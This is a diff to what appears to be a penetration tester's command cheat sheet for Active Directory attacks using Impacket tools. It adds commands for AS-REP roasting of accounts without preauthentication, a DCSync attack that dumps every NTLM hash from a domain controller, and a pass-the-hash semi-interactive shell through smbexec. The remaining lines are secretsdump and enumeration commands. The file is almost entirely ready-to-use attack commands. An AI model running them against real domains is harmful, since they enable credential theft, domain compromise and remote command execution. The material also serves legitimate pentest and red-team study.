@@ -1,9 +1,12 @@
-% asproasting, active-directory
+% roasting, active-directory
 
-# Get user hash from users file
+# Get all hash of domain (no preauth roasting)
+GetNPUsers.py <domain>/<user> -request -no-pass -dc-ip <ip>
+
+# Get user hash from users file (no preauth roasting)
 GetNPUsers.py -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
 
-# Get hash for a user
+# Get hash for a user (no preauth roasting)
 GetNPUsers.py -no-pass -dc-ip <ip> <domain>/<user>
 
 % rpc
@@ -24,6 +27,9 @@ secretsdump.py -hashes <ntlmhash>:<ntlmhash> '<user>'@<target>
 
 # Get all secrets a user as access from a dc
 secretsdump.py -just-dc <user>
+
+# GetChangesAll perm: DCSync attack to dump all ntlm hashes
+secretsdump.py -dc-ip <dc> <domain>/<user>:<passwor>@<dc>
 
 % registry
 
@@ -52,3 +58,6 @@ mssqlclient.py <user>@<target>
 
 # enumerate user via smb with guest
 lookupsid.py guest@<target>
+
+# Get semi-interactive shell to execute command
+smbexec.py -hashes :<hash> <user>@<target>
